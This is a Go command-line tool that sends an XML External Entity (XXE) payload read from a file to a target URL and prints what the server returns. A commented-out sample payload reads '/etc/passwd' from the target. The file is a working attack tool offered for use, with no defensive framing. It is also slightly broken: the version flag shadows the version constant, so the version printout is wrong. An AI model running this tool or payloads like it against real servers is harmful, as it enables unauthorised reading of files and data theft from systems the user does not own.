package main

import (
	"bytes"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"time"
)

const version = "1.0.3"

func main() {

	// Define the URL of the vulnerable server
	url := flag.String("u", "http://vulnerable-server.com/xxe-endpoint", "The url of the vulnerable server")

	// Define the timeout flag
	timeout := flag.Int("t", 30, "The timeout for the HTTP request in seconds")
	
	// Define the payload flag
        payloadFile := flag.String("p", "", "The file containing the XML payload")
	
	// Define the verbose flag
	verbose := flag.Bool("verbose", false, "Print debugging information")
	
	// Define the version flag
	version := flag.Bool("version", false, "Print the version number of the tool")

	// Parse the command line flags
	flag.Parse()
	
	// Read the payload from the specified file
        payload, err := ioutil.ReadFile(*payloadFile)
        if err != nil {
            fmt.Println("Error reading payload file:", err)
            return
        }

	// Create an XML payload with an XXE injection
// 	payload := `
// 		<!DOCTYPE foo [
// 		<!ELEMENT foo ANY >
// 		<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
// 		<foo>&xxe;</foo>
// 	`

	// Create a new HTTP client with the specified timeout
	client := &http.Client{
		Timeout: time.Duration(*timeout) * time.Second,
	}
	
	if *verbose {
		fmt.Println("Sending payload to", *url)
	}
	
	if *version {
		fmt.Println("Version:", version)
		return
	}

	// Send the payload to the server using an HTTP POST request
	resp, err := client.Post(*url, "application/xml", bytes.NewBuffer([]byte(payload)))
	if err != nil {
		fmt.Println("Error sending payload:", err)
		return
	}
	
	if *verbose {
		fmt.Println("Response received from server")
	}

	// Check the response status code
	if resp.StatusCode != http.StatusOK {
		fmt.Printf("Error sending payload: HTTP %d\n", resp.StatusCode)
		return
	}

	// Read the response from the server
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return
	}

	// Print the response from the server
	fmt.Println(string(body))
}
